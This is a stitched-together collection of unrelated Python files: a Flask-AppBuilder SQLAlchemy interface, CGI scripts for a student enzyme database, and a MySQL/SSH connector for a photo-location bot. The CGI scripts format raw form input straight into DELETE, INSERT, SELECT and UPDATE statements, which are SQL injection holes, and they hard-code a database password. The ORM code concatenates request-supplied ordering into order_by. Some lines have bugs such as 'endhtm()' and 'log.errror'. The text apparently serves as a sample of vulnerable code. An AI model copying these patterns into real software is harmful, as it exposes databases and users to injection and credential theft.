                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)                    
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """
    ------------- 
     GET METHODS
    -------------
    """

    def get_columns_list(self):
        """
            Returns all model's columns on SQLA properties
        """
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """
            Returns all model's columns except pk or fk
        """
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


"""
    For Retro-Compatibility
"""
SQLModel = SQLAInterface

import re
from flask import request


class Stack(object):
    """
        Stack data structure will not insert
        equal sequential data
    """
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """
        Get page arguments for group by
    """
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))                    
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))

#!/usr/bin/python3

import cgi
import mysql.connector
from html import beghtml, endhtml

# getting all the values from the form
form = cgi.FieldStorage()
enzyme_name   = form.getvalue('enzyme_name')
process_name  = form.getvalue('process_name')
enzyme_name2  = form.getvalue('enzyme_name2')
process_name2 = form.getvalue('process_name2')
enzyme_name3  = form.getvalue('enzyme_name3')
conc          = form.getvalue("conc")
compound      = form.getvalue("compound")
intermediate  = form.getvalue("inter")
sub           = form.getvalue("sub")
organelle     = form.getvalue("organelle")
enzyme_name3  = form.getvalue("enzyme_name3")
process_name3 = form.getvalue("process_name3")
organelle2    = form.getvalue("organelle2")
conc2         = form.getvalue("conc2")
compound2     = form.getvalue("compound2")

# establishing connection, cursor
cnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')
query = ""
cursor = cnx.cursor()

# depending on the user input- assign the query
# if multiple text boxes are filled, the last row to be filled in will be executed
if enzyme_name:
    query = "delete from converts where enzyme_name = '%s'" % enzyme_name                    

if enzyme_name3:                    
    query = "delete from enzyme where enzyme_name = '%s'" % enzyme_name3                    
    
if process_name:                    
    query = "delete from process where process_name = '%s'" % process_name                    

if process_name2 and enzyme_name2:
    query = "delete from uses where process_name = '%s' and enzyme_name = '%s'" % (process_name2, enzyme_name2)                    

if conc and compound:
    query = "delete from conds where concentration = '%s' and compound = '%s'" % (conc, compound)                    

if intermediate:
    query = "delete from intermediate where intermediate_name = '%s'" % intermediate                    

if organelle and sub:
    query = "delete from location where organelle = '%s' and substructure = '%s'" % (organelle, sub)                    

if enzyme_name3 and organelle2:
    query = "delete from located_in where enzyme_name = '%s' and organelle = '%s'" % (enzyme_name3, organelle2)                    

if process_name3 and conc2 and compound2:
    query = "delete from operates_uner where process_name = '%s' and concentration = '%s' and compound = '%s'" % (process_name3, conc2, compound2)                    


# if empty form - give the user an option to fill in something or go back to the home page
hasError = False
if not query:
    beghtml()
    print("<h3>You didn't fill anything out! :/</h3>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/delete.html">Back</a></b>')
    print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
    endhtml()
    hasError = True

# checking for errors - if there is an error, show it on the screen
try:
    cursor.execute(query)                    
    cnx.commit()
    
except mysql.connector.Error as err:
    beghtml()
    print("Something went wrong: {}".format(err) + "<br><br>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/delete.html">Back</a></b>')
    endhtm()
    hasError = True

# otherwise print the repsonse to the screen
if hasError == False:
    # html with the response from the delete 
    beghtml()
    print("<h3>Deleted!</h3>")                                      
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py">Current Database</a></b><br><br>')
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Try Something Else!</a></b><br><br>')
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/delete.html">Back</a></b>')
    endhtml()
    
cursor.close()
cnx.close()

#!/usr/bin/python3                                     
                                
import cgi
import mysql.connector
from html import beghtml, endhtml

# getting the values from the html form
form = cgi.FieldStorage()
insert_table = form.getvalue('insert_table')
values       = form.getvalue('values')


if values:   # make sure not empty to split and then split on the comma
    values = values.split(', ')                    

svalues = ""                    
if values:
    for value in values:
        # concatenate them into the appropriate syntax, removing any unnecessary whitespace
        svalues += "'%s', " % value.strip()                    
    svalues = svalues[:-2]                    

# mysql connection
cnx = mysql.connector.connect(user='eapfelba', host = 'localhost', database='eapfelba2', password='chumash1000')
query=""  # intialized as empty to prevent errors
cursor = cnx.cursor()

# creating the query based on the user input
if insert_table and values:
    query = "insert into %s values (%s)" % (insert_table, svalues)                    

# checking for errors
hasError = False
if not query:  # empty form
    beghtml()
    print("<h3>You didn't fill anything out! :/</h3>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/insert.html">Back</a></b>')
    print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
    endhtml()
    hasError = True
    
if query:
    try: # try to execute the query, otherwise print out the issue on an html page and give the user options to go back
        cursor.execute(query)                    
        cnx.commit()   
    except mysql.connector.Error as err:
        beghtml()
        print("Something went wrong: {}".format(err) + "<br><br>")
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/insert.html">Back</a></b>')
        endhtml()
        hasError = True

# if there is no error, print out the results!
if hasError == False:
    beghtml()
    print("<h3>")
    # print them out in the right format for the results page
    temps = svalues.split(", ")                    
    for s in temps:                    
        print("<b> | %s" % s[1:-1])                    
    print(" | </b></h3>")
    print("<h3>is now in the table %s!</h3>" % insert_table)
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py">Current Database</a></b><br><br>')
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Try Something Else!</a></b><br><br>')
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/insert.html">Back</a></b>')
    endhtml()
    
cursor.close()
cnx.close()

#!/usr/bin/python3                                                                           
import cgi
import mysql.connector
from html import beghtml, endhtml

# getting values from the form
form = cgi.FieldStorage()
search_enzyme   = form.getvalue('search_enzyme')
search_process1 = form.getvalue('search_process1')
search_process2 = form.getvalue('search_process2')
search_enzyme2  = form.getvalue("search_enzyme2")
search_process3 = form.getvalue("search_process3")
sub             = form.getvalue("sub")
inter           = form.getvalue("inter")
search_process5 = form.getvalue("search_process5")
search_enzyme3  = form.getvalue("search_enzyme3")
reac            = form.getvalue("reac")
search_enzyme4  = form.getvalue("search_enzyme4")
inter2          = form.getvalue("inter2")

# establishing sql connection
cnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')
cursor = cnx.cursor()
query = ""
key = ""

# different options to select- assign query based on input
# the last text box to be filled in on the form will be executed
# the title helps with printing the result to the html
if search_enzyme:
    query = "select process_name from uses where enzyme_name = '%s'"  % search_enzyme                    
    title = "Processes"
    
if search_process1:
    query = "select enzyme_name from uses where process_name = '%s'" % search_process1                    
    title = "Enzymes"
    
if search_process2:
    query = "select distinct organelle from uses natural join located_in where process_name = '%s'" % search_process2                    
    title = "Organelles"
    
if search_enzyme2:
    query = "select ligand_mechanism from enzyme where enzyme_name = '%s'" % search_enzyme2                    
    title = "Ligand Mechanisms"
    
if search_process3:
    query = "select goal_product from process where process_name = '%s'" % search_process3                    
    title = "Goal Products"
    
if sub:
    query = "select organelle from location where substructure = '%s'" % sub                    
    title = "Organelles"
    
if inter:
    query = "select concentration from conds where compound = '%s'" % inter                    
    title = "Concentrations"

# keep track of an extra variable so that it will know to print an extra line of results (onyl query with a tuple result)
if search_process5: 
    query = "select concentration, compound from operates_under where process_name = '%s'" % search_process5                    
    title = "Conditions"
    key = 'one'
    
if search_enzyme3 and reac:
    query = "select product_name from converts where enzyme_name = '%s' and reactant_name = '%s'" % (search_enzyme3, reac)                    
    title = "Products"
    
if search_enzyme4:
    query = "select organelle from located_in where enzyme_name = '%s'" % search_enzyme4                    
    title = "Organelles"
    
if inter2:
    query = "select concenration from intermediate where intermediate_name = '%s'" % inter2                    
    title = "Concentrations"

# avoid error with empty form- give the user option to fill in information or go back to home page
if not query:
    beghtml()
    print("<h3>You didn't fill anything out! :/</h3>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/select.html">Back</a></b>')
    print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
    endhtml()
    
# catching errors- blank form, wrong syntax, etc
# try executing query and spit back error to the screen if there is a problem
hasError = False
if query:
    try:
        cursor.execute(query)        
    except mysql.connector.Error as err:
        print("<b>Something went wrong:</b> {}".format(err) + "<br><br>")
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/select.html">Back</a></b>')
        endhtml()
        hasError = True

# otherwise, print out the response with links back and to home
if hasError == False:
    response = cursor.fetchall()
    beghtml()
    if not response:                                                                                     
        print("<h3>no results found</h3>")
    else:
        print("<h3>Results!</h3>")
        print("<h3>%s</h3>" % title) 
        for r in response:
            print("<b> %s" % r[0])
            if key:  # if there was a second value of the data like (concentration, compound)
                print("%s</br>" % r[1])
            print("<br>")
    print("</b><br>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Try Something Else!</a></b><br><br>')
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/select.html">Back</a></b><br><br>')
    endhtml()

cursor.close()
cnx.close()

#! /usr/bin/python3

import cgi
import mysql.connector
from html import beghtml, endhtml

# getting all the values from the html form
form = cgi.FieldStorage()
enzyme_name    = form.getvalue('enzyme_name')
product_name   = form.getvalue('product_name')
enzyme_name2   = form.getvalue('enzyme_name2')
mechanism_name = form.getvalue('mechanism_name')
process_name   = form.getvalue('process_name')
concentration  = form.getvalue('concentration')
compound_name  = form.getvalue('compound_name')
process_name2  = form.getvalue('process_name2')
goal           = form.getvalue('goal')
inter          = form.getvalue('inter')
conc           = form.getvalue('conc')
process_name3  = form.getvalue('process_name3')
enzyme_name3   = form.getvalue('enzyme_name3')
enzyme_name4   = form.getvalue('enzyme_name4')
organelle      = form.getvalue('organelle')
sub            = form.getvalue('sub')
organelle2     = form.getvalue('organelle2')
sub2           = form.getvalue('sub2')
conc2          = form.getvalue('conc2')
comp           = form.getvalue('comp')
loc            = form.getvalue('loc')
sub3           = form.getvalue('sub3')
sub4           = form.getvalue('sub4')

# establishing connection to the database
cnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')
cursor = cnx.cursor(buffered=True)
query = ""  # initializing empty queries to avoid errors
query2 = ""

# depending on the user input assign the query
# the second query searches for the updated data in the database and shows the user what they inputed
# if multiple are filled in, the last one will be executed
if enzyme_name and product_name:
    query = "update converts set product_name = '%s' where enzyme_name = '%s'" % (product_name, enzyme_name)                    
    query2 = "select * from converts where product_name = '%s' and enzyme_name = '%s'" % (product_name, enzyme_name)                    
    
if enzyme_name2 and mechanism_name:
    query = "update enzyme set ligand_mechanism = '%s' where enzyme_name = '%s'" % (mechanism_name, enzyme_name2)                    
    query2 = "select * from enzyme where enzyme_name = '%s'" % enzyme_name2                    
    
if process_name and concentration and compound_name:
    query = "update operates_under set concentration = '%s', compound = '%s' where process_name = '%s'" % (concentration, compound_name, process_name)                    
    query2 = "select * from operates_under where process_name = '%s'" % process_name                    

if process_name2 and goal:
    query = "update process set goal_product = '%s' where process_name = '%s'" % (goal, process_name2)                    
    query2 = "select * from process where process_name = '%s'" % process_name2                    

if inter and conc:
    query = "update intermediate set concenration = '%s' where intermediate_name = '%s'" % (conc, inter)                    
    query2 = "select * from intermediate where intermediate_name = '%s'" % inter                    

if process_name3 and enzyme_name3:
    query = "update uses set enzyme_name = '%s' where process_name = '%s'" % (enzyme_name3, process_name3)                    
    query2 = "select * from uses where process_name = '%s' and enzyme_name = '%s'" % (process_name3, enzyme_name3)                    

if enzyme_name4 and organelle and sub and sub4:
    query = "update located_in set organelle = '%s', substructure = '%s' where enzyme_name = '%s' and substructure = '%s'" % (organelle, sub, enzyme_name4, sub4)                    
    query2 = "select * from located_in where enzyme_name = '%s'" % enzyme_name4                    
    
if organelle2 and sub2:
    query = "update location set substructure = '%s' where organelle = '%s' and substructure = '%s'" % (sub2, organelle2, sub3)                    
    query2 = "select * from location where organelle = '%s' and substructure = '%s'" % (organelle2, sub2)                    

if conc2 and comp and loc:
    query = "update conds set prime_location = '%s' where concentration = '%s' and compound = '%s'" % (loc, conc2, comp)                    
    query2 = "select * from conds where concentration = '%s' and compound = '%s' and prime_location = '%s'" % (conc2, comp, loc)                    


hasError = False
if not query: # blank form - give the user option to go back or to the home page
    beghtml()
    print("<h3>You didn't fill anything out! :/</h3>")
    print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/update.html">Back</a></b>')
    print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
    endhtml()
    hasError = True

if query: # errors
    try:
        cursor.execute(query)                    
        cnx.commit()

    except mysql.connector.Error as err:
        beghtml()
        print("Something went wrong: {}".format(err) + "<br><br>")
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/update.html">Back</a></b>')
        print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
        endhtml()
        hasError = True
        
# if there were no errors when executing the first query, continue executing the second
if hasError == False:
    cursor.execute(query2)                    
    data = cursor.fetchall()
    
    # html with the response from the update           
    beghtml()
    
    # if the first query did not come up with an error but the second did (typo, value not in the table)
    # i.e. the select statement came up with nothing..
    # print that something went wrong and give an option to go back
    if not data:
        print("<h3><b>Something went wrong </b></h3>")
        print("<b>Check your spelling!</b><br><br>")
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/update.html">Back</a></b>')
        print('<br><b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Home</a></b>')
    # otherwise, you want to print out what the database not reads
    else:
        print("<h3>Updated!</h3>")
        print("The database now reads <br><br>")
        for result in data[0]:
            print("<b> | %s" % result)
        print(" | </b>")
        print("<br><br>")
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py">Current Database</a></b><br><br>')
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/biobase.html">Try Something Else!</a></b><br><br>')
        print('<b><a href = "http://ada.sterncs.net/~eapfelbaum/update.html">Back</a></b>')
    endhtml()


cursor.close()
cnx.close()


"""
Module that provides a way to connect to MySQL and reconnect each time
connection is lost. It also can automatically set up SSH tunnel thanks to
sshtunnel module

Original way to do it was described at
https://help.pythonanywhere.com/pages/ManagingDatabaseConnections/
"""

import socket

# goes as mysqlclient in requirements
import MySQLdb
import sshtunnel

from photogpsbot import log
import config


class DatabaseError(Exception):
    pass


class DatabaseConnectionError(Exception):
    pass


class Database:
    """
    Class that provides method to execute queries and handles connection to
    the MySQL database directly and via ssh if necessary
    """
    conn = None
    tunnel = None
    tunnel_opened = False

    def _open_ssh_tunnel(self):
        """
        Method that opens ssh tunnel to the server where the database of
        photogpsbot is located
        :return: None
        """
        log.debug('Establishing SSH tunnel to the server where the database '
                  'is located...')
        sshtunnel.SSH_TIMEOUT = 5.0
        sshtunnel.TUNNEL_TIMEOUT = 5.0
        self.tunnel = sshtunnel.SSHTunnelForwarder(
            ssh_address_or_host=config.SERVER_ADDRESS,
            ssh_username=config.SSH_USER,
            ssh_password=config.SSH_PASSWD,
            ssh_port=22,
            remote_bind_address=('127.0.0.1', 3306))

        self.tunnel.start()
        self.tunnel_opened = True
        log.debug('SSH tunnel has been established.')

    def connect(self):
        """
        Established connection either to local database or to remote one if
        the script runs not on the same server where database is located
        :return: None
        """
        if socket.gethostname() == config.PROD_HOST_NAME:
            log.info('Connecting to the local database...')
            port = 3306
        else:
            log.info('Connecting to the database via SSH...')
            if not self.tunnel_opened:
                self._open_ssh_tunnel()

            port = self.tunnel.local_bind_port

        self.conn = MySQLdb.connect(host='127.0.0.1',
                                    user=config.DB_USER,
                                    password=config.DB_PASSWD,
                                    port=port,
                                    database=config.DB_NAME,
                                    charset='utf8')
        log.info('Connected to the database.')

    def execute_query(self, query, parameters=None, trials=0):
        """
        Executes a given query
        :param query: query to execute
        :param trials: integer that denotes number of trials to execute
        a query in case of known errors
        :return: cursor object
        """
        if not self.conn or not self.conn.open:
            self.connect()

        try:
            cursor = self.conn.cursor()
            cursor.execute(query, parameters)

        # try to reconnect if MySQL server has gone away
        except MySQLdb.OperationalError as e:

            # (2013, Lost connection to MySQL server during query)
            # (2006, Server has gone away)
            if e.args[0] in [2006, 2013]:
                log.info(e)
                # log.debug("Connecting to the MySQL again...")

                self.connect()
                if trials > 3:
                    log.error(e)
                    log.warning("Ran out of limit of trials...")
                    raise DatabaseConnectionError("Cannot connect to the "
                                                  "database")

                trials += 1
                # trying to execute query one more time
                log.warning(e)
                log.info("Trying execute the query again...")
                return self.execute_query(query, parameters, trials)
            else:
                log.error(e)
                raise
        except Exception as e:
            log.error(e)
            raise
        else:
            return cursor

    def add(self, query):                    
        """
        Shortcut to add something to a database
        :param query: query to execute
        :return: boolean - True if the method succeeded and False otherwise
        """

        try:
            self.execute_query(query)                    
            self.conn.commit()
        except Exception as e:
            log.errror(e)
            raise DatabaseError("Cannot add your data to the database!")

    def disconnect(self):
        """
        Closes the connection to the database and ssh tunnel if needed
        :return: True if succeeded
        """
        if self.conn:
            self.conn.close()
            log.info('Connection to the database has been closed.')
        if self.tunnel:
            self.tunnel.stop()
            log.info('SSH tunnel has been closed.')
        self.tunnel_opened = False
        return True

    def __str__(self):
        return (f'Instance of a connector to the database. '
                f'The connection is {"opened" if self.conn else "closed"}. '
                f'SSH tunnel is {"opened" if self.tunnel_opened else "closed"}'
                '.')

from dataclasses import dataclass
from typing import Dict

import exifread
from exifread.classes import IfdTag
from geopy.geocoders import Nominatim

from photogpsbot import bot, log, db, User


class InvalidCoordinates(Exception):
    """
    Coordinates have invalid format
    """


class NoCoordinates(Exception):
    """
    There is no location info
    """


class NoEXIF(Exception):
    """
    Means that there is no EXIF within the photo at all

    """


class NoData(Exception):
    """
    Means that there is actually no any data of our interest within the picture

    """


@dataclass
class ImageData:
    """
    A class to store info about a photo from user.
    """
    user: User
    date_time: str = None
    camera: str = None
    lens: str = None
    address: str = None
    country: Dict[str, str] = None
    latitude: float = None
    longitude: float = None


@dataclass
class RawImageData:
    """
    Raw data from photo that is still have to be converted in order to be used.
    """
    user: User
    date_time: str = None
    camera_brand: str = None
    camera_model: str = None
    lens_brand: str = None
    lens_model: str = None
    latitude_reference: str = None
